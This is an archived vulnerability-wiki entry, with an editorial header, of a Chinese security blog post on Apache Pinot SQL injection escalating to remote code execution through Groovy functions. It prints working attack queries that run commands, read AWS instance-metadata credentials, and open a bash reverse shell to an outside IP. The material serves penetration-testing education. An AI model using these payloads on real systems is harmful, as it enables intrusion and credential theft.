---
source: "gelusus/wxvl 公众号漏洞文库"
title: "Apache Pinot SQL注入与远程代码执行漏洞分析"
product: "Apache Pinot"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "允许Groovy函数、查询执行权限、应用实际存在SQL注入时才能远程间接触发；运行用户/出网限制"
source_status: "unknown"
side_effects: "含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。"
id: "vw-12e40f964d8b2209e79d2dee"
entity_id: "ve-12e40f964d8b2209e79d2dee"
schema_version: "1"
---

# Apache Pinot SQL注入与远程代码执行漏洞分析

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：允许Groovy函数、查询执行权限、应用实际存在SQL注入时才能远程间接触发；运行用户/出网限制
- 证据范围：给出直接完整SQL而非业务SQL注入点，不能据此证明Pinot自身SQL注入；原研究链接有保留价值。

### 本次正文校订

- 移除 3 组不含任何正文的空代码围栏；保留全部非空代码。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 没有测试版本，2022研究2024转载仍称默认，应核验版本配置变化
- root权限并非漏洞保证，取决于Pinot进程账户
- IAM示例定义collab却未发送数据，也无结果回传，标题窃取凭据超出代码所示；IMDS访问条件缺失
- Minikube部署只有提纲，没有可复现配置
- 多个空代码块、付费推广；数据库主分类建议
- 可与39676资料关联但未官方核对不能自动补CVE

### 操作风险与资料使用

- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

umbrella枇杷哥  黑伞安全   2024-04-16 18:02  
  
## 引言  
  
聊一下Apache Pinot数据库平台的安全漏洞，特别是SQL注入（SQLi）和远程代码执行（RCE）的问题。Apache Pinot是一个实时分布式OLAP数据存储系统，专为提供超低延迟的分析而设计。本文将指导渗透测试人员如何将他们对传统数据库系统的了解应用于Apache Pinot，并展示如何将SQL注入漏洞升级为远程代码执行。  
## Apache Pinot简介  
  
Apache Pinot是为即时查询流式数据、支持多用户同时执行复杂查询、快速聚合或过滤大量数据的场景而设计的。例如，LinkedIn使用Pinot为其“谁查看了我的个人资料”等特性提供支持，而外卖平台UberEats则为餐厅提供了一个由Pinot驱动的仪表板，用于分析客户满意度、热门菜单项、销售和服务质量问题。  
## 架构细节  
  
Pinot使用Java编写，数据表被分割成多个片段（Segments），通常基于时间戳进行分割，并可存储在不同的位置。Pinot集群由多个组件构成，包括控制器（Controllers）、服务器（Servers）和代理（Brokers）。服务器存储数据片段，代理负责接收客户端的查询请求并将其转发给服务器，控制器负责维护集群元数据和管理其他组件。  
## 测试环境搭建  
  
使用Minikube快速搭建多节点环境的方法如下：  
1. 通过Kubernetes快速启动Minikube。  
  
1. 安装Pinot Helm图表。  
  
1. 通过Kafka进行数据摄取。  
  
1. 暴露控制器端口以访问查询编辑器和集群管理UI。  
  
## SQL语法与注入基础  
  
Pinot的SQL语法基于Apache Calcite，但不支持Calcite参考中的许多特性。以下是一些有用的语言特性：  
```
-- 字符串处理
SELECT "someColumn", 'a ''string'' with quotes', CONCAT('abc','efg','d') FROM myTable;

-- 子字符串
SELECT SUBSTR('abcdef', -3, -1) FROM ignoreMe -- 'def'

-- 过滤器
SELECT * FROM airlineStatsAvro WHERE 0 = Year - Year AND ArrTimeBlk != 'blahblah-bc'
```  
  
Pinot默认允许任何能够查询数据库的用户在服务器上执行代码，这是一个巨大的安全漏洞。通过Groovy脚本，攻击者可以实现RCE，获取服务器的root权限。以下是RCE的示例查询：  
```
-- 获取当前用户信息
SELECT * FROM myTable WHERE groovy('{"returnType":"INT","isSingleValue":true}', 'println "whoami".execute().text; return 1') = 1 limit 5;

-- 窃取AWS临时IAM凭据
SELECT * FROM myTable WHERE groovy('{"returnType":"INT","isSingleValue":true}', 'def aws = "169.254.169.254/latest/meta-data/iam/security-credentials/"; def collab = "xyz.burpcollaborator.net/"; def role = "curl -s ${aws}".execute().text.split("\n")[0].trim(); def creds = "curl -s ${aws}${role}".execute().text;') = 1;

-- 创建反向Shell
SELECT * FROM myTable WHERE groovy('{"returnType":"INT","isSingleValue":true}', '["bash", "-c", "bash -i >& /dev/tcp/192.168.0.4/443 0>&1"].execute(); return 1') = 1;
```  
  
  
参考：https://blog.doyensec.com/2022/06/09/apache-pinot-sqli-rce.html  
  
https://docs.pinot.apache.org/users/user-guide-query/scalar-functions#groovy-scripts  
  
  
  
如果你是一个长期主义者，欢迎加入我的知识星球,我们一起冲，一起学。每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGoa1Yh6UHSvgToDQcqx7RLLnJIWwnw3z5JvaexDaclyMwMial9BMOBqkJESSKALIQHIL6T2xTV9GKw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
